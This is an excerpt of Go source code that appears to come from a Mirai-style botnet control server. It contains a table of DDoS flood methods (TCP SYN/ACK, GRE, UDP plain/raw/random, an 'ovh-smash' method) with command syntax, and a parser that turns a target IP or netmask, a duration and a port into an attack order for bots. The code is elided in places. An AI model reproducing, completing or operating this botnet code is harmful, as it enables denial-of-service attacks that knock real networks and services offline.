...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    ...
    "/tcpsyn": AttackInfo {                                                                        
        ...
        "/tcpsyn [ip] [time] dport=[port] (tcp)",
    },
    "/tcpack": AttackInfo {
        1,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "/tcpack [ip] [time] dport=[port] (tcp)",
    },
    "/greip": AttackInfo {
        2,
        []uint8 {0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
        "/greip [ip] [time] dport=[port] (raw)",
    },
    "/udp-std": AttackInfo {
        3,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "/udp-std [ip] [time] dport=[port] (udp)",
    },
    "/ovh-smash": AttackInfo {
        4,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "/ovh-smash [ip] [time] dport=[port] (tcp)",
    },
    "/udpplain": AttackInfo {                                                                        
        5,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "/udpplain [ip] [time] dport=[port] (udp)",
    },
    "/udpraw": AttackInfo {                                                                        
        6,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "/raw [ip] [time] dport=[port] (raw)",
    },
    "/tcppsh": AttackInfo {                                                                        
        7,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
    ...
    "/udphex": AttackInfo {                                                                        
        8,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "/raw [ip] [time] dport=[port] (udp)",
    },    
    "/udprand": AttackInfo {                                                                        
        9,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "/udprand [ip] [time] dport=[port] (udp)",
    },
    "/udpstr": AttackInfo {
        10,
...
func NewAttack(str string, admin int) (*Attack, error) {
    ...
    if len(args) == 0 {
        ...
        if args[0] == "methods" {
            ...
            for cmdName, atkInfo := range attackInfoLookup {
                validCmdList += cmdName + "\x1b[1;91m: " + atkInfo.attackDescription + ".\r\n"
            }
        ...
        if !exists {
            return nil, errors.New(fmt.Sprintf("\033[97mThe following command is not valid: \033[91m%s.", args[0]))
        }
    ...
    // Parse targets
    if len(args) == 0 {
        return nil, errors.New("\033[97mMust specify prefix/netmask as targets.")
    } else {
        if args[0] == "?" {
        ...
        for _,cidr := range cidrArgs {
            ...
            if len(cidrInfo) == 2 {
                ...
                if err != nil || netmask > 32 || netmask < 0 {
                    return nil, errors.New(fmt.Sprintf("\033[97mInvalid netmask was supplied. \033[33m(near %s)", cidr))
                }
                netmask = uint8(netmaskTmp)
            } else if len(cidrInfo) > 2 {
                return nil, errors.New(fmt.Sprintf("\033[97mToo many /'s in prefix. \033[33m(near %s)", cidr))
            }

            ip := net.ParseIP(prefix)
            if ip == nil {
                return nil, errors.New(fmt.Sprintf("\033[97mFailed to resolve the IP address. \033[33m(near %s)", cidr))
            }
    ...
    if len(args) == 0 {
        ...
        if err != nil || duration == 0 || duration > 1800 { // 86400
            return nil, errors.New(fmt.Sprintf("\033[97mInvalid attack duration. \033[33m(near %s). \033[97mDuration must be between 0 and 60 seconds", args[0]))
        }
